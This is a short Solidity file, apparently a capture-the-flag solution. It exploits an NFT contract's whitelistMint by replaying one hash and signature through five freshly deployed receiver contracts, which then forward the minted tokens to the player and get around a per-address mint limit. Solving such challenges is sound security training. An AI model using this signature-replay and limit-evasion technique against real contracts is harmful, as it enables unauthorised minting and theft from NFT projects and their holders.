// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity >=0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./VNFT.sol";

contract HackVNFTReceiver is IERC721Receiver {
    address player;

    constructor(address _player) {
        player = _player;
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        IERC721(msg.sender).transferFrom(address(this), player, tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract HackVNFT {
    function hack(
        bytes32 hash,
        bytes memory signature,
        address instance
    ) external {
        for (uint256 i = 0; i < 5; i++) {
            HackVNFTReceiver receiver = new HackVNFTReceiver(msg.sender);
            VNFT(instance).whitelistMint(address(receiver), 2, hash, signature);
        }
    }
}
